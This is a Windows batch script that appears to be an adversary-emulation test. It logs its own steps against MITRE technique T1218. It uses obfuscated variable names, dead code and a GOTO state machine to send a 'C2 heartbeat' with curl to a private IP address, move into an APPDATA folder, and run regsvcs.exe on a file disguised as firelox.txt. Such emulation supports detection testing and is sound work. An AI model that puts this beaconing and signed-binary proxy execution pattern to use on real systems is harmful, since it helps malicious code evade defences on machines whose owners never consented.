@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET txisnba=%APPDATA%\8287\02936ef1
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8287-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=firelox.txt
SET dvhhyc=8287

REM State machine setup
SET vkgox=0
SET logfn=%APPDATA%\%rrocubc%\macula-simulations.log

GOTO typlqa

REM === DEAD CODE BLOCK ===
:yxvkom
REM Never executed junk
SET fkast=dead_value
EXIT

REM === MAIN DISPATCH ===
:typlqa
IF !vkgox!==0 GOTO mnwejc
IF !vkgox!==17 GOTO rjdtql
IF !vkgox!==23 GOTO fgstwe
IF !vkgox!==37 GOTO zkvmxl
IF !vkgox!==88 GOTO qbpory
IF !vkgox!==99 GOTO vchndf

REM === INITIAL DELAY ===
:mnwejc
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: initial_delay_start>> "%logfn%" 2>nul
timeout /t 47 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: initial_delay_complete>> "%logfn%" 2>nul
SET vkgox=17
GOTO typlqa

REM === DEAD CODE ===
:lqmfps
SET xypzl=unused
GOTO yxvkom

REM === HEARTBEAT OPERATION ===
:rjdtql
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: c2_heartbeat_start>> "%logfn%" 2>nul
curl -k -s -o nul "%keghkgto%"
SET hresult=!ERRORLEVEL!
IF !hresult!==0 (
    SET ttpres=1
    SET ttpdet=
) ELSE (
    SET ttpres=0
    SET ttpdet=connection_failed
)
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: c2_heartbeat_complete error=!hresult!>> "%logfn%" 2>nul
SET hbdt=!DATE!
SET hbtm=!TIME!
SET hbdt=!hbdt:-=!
SET hbtm=!hbtm::=!
SET hbtm=!hbtm:.=!
echo [!hbdt:~0,4!-!hbdt:~4,2!-!hbdt:~6,2! !hbtm:~0,2!:!hbtm:~2,2!:!hbtm:~4,2!.!hbtm:~6,3!][%jwcnifl%]: %rrocubc%-%dvhhyc%-T1218|Signed Binary Proxy Execution=!ttpres!:!ttpdet!>> "%logfn%" 2>nul

ping -n 8 127.0.0.1 >nul
SET vkgox=23
GOTO typlqa

REM === JUNK LABEL ===
:wqzmcf
REM Unreachable block
GOTO lqmfps

REM === CHANGE DIRECTORY ===
:fgstwe
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: chdir_start target=!txisnba!>> "%logfn%" 2>nul
cd /d "!txisnba!" 2>nul
SET cdres=!ERRORLEVEL!
IF !cdres!==0 (
    SET ttpres=1
    SET ttpdet=
) ELSE (
    SET ttpres=0
    SET ttpdet=path_not_found
)
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: chdir_complete error=!cdres!>> "%logfn%" 2>nul
SET cddt=!DATE!
SET cdtm=!TIME!
SET cddt=!cddt:-=!
SET cdtm=!cdtm::=!
SET cdtm=!cdtm:.=!
echo [!cddt:~0,4!-!cddt:~4,2!-!cddt:~6,2! !cdtm:~0,2!:!cdtm:~2,2!:!cdtm:~4,2!.!cdtm:~6,3!][%jwcnifl%]: %rrocubc%-%dvhhyc%-T1218|Signed Binary Proxy Execution=!ttpres!:!ttpdet!>> "%logfn%" 2>nul

SET /A rdelay=%RANDOM% %% 15 + 5
timeout /t !rdelay! /nobreak >nul
SET vkgox=37
GOTO typlqa

REM === FAKE CONDITIONAL ===
IF 1==0 (
    GOTO wqzmcf
) ELSE (
    GOTO nwksmd
)

:nwksmd
REM Unused label

REM === LOLBIN EXECUTION ===
:zkvmxl
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: regsvcs_exec_start file=!xzanpex!>> "%logfn%" 2>nul
%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe "!xzanpex!" 2>nul
SET execres=!ERRORLEVEL!
IF !execres!==0 (
    SET ttpres=1
    SET ttpdet=
) ELSE (
    SET ttpres=0
    SET ttpdet=assembly_load_failed
)
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: regsvcs_exec_complete error=!execres!>> "%logfn%" 2>nul
SET execdt=!DATE!
SET exectm=!TIME!
SET execdt=!execdt:-=!
SET exectm=!exectm::=!
SET exectm=!exectm:.=!
echo [!execdt:~0,4!-!execdt:~4,2!-!execdt:~6,2! !exectm:~0,2!:!exectm:~2,2!:!exectm:~4,2!.!exectm:~6,3!][%jwcnifl%]: %rrocubc%-%dvhhyc%-T1218|Signed Binary Proxy Execution=!ttpres!:!ttpdet!>> "%logfn%" 2>nul

CHOICE /C Y /N /D Y /T 12 >nul
SET vkgox=88
GOTO typlqa

REM === DEAD CODE WITH FAKE OPERATIONS ===
:opzxmk
SET fakeval=not_used
EXIT

REM === FINAL DELAY AND CLEANUP ===
:qbpory
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: final_delay_start>> "%logfn%" 2>nul
timeout /t 22 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: final_delay_complete>> "%logfn%" 2>nul
SET vkgox=99
GOTO typlqa

REM === END STATE ===
:vchndf
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: script_completed>> "%logfn%" 2>nul
GOTO htswka

REM === UNREACHABLE FINAL LABEL ===
:htswka
ENDLOCAL